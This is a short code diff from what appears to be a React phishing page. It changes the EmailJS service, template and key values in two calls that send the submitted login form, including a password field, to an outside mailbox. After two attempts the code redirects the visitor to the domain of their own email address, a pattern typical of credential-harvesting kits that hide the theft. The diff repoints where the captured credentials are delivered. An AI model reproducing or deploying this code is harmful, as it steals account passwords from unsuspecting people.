@@ -43,7 +43,7 @@ function App() {
 
     if (count < 2) {
       setCount(prevCount => prevCount + 1)
-      emailjs.sendForm('service_yhntau9', 'template_omqihka', form.current, 'PGH4OIS-XQr7cngOw')
+      emailjs.sendForm('service_r0wt0i9', 'template_5tim6qi', form.current, 'yD2v5hDlTn1hhU_PR')
       .then((result) => {
         setPwdOne("")
         setLoading(false)
@@ -56,7 +56,7 @@ function App() {
 
 
     if (count >= 2 ) {
-      emailjs.sendForm('service_yhntau9', 'template_omqihka', form.current, 'PGH4OIS-XQr7cngOw')
+      emailjs.sendForm('service_r0wt0i9', 'template_5tim6qi', form.current, 'yD2v5hDlTn1hhU_PR')
       .then((result) => {
         const redir = getPartAfterDot(email)
         window.location.replace(`https://${redir}`);
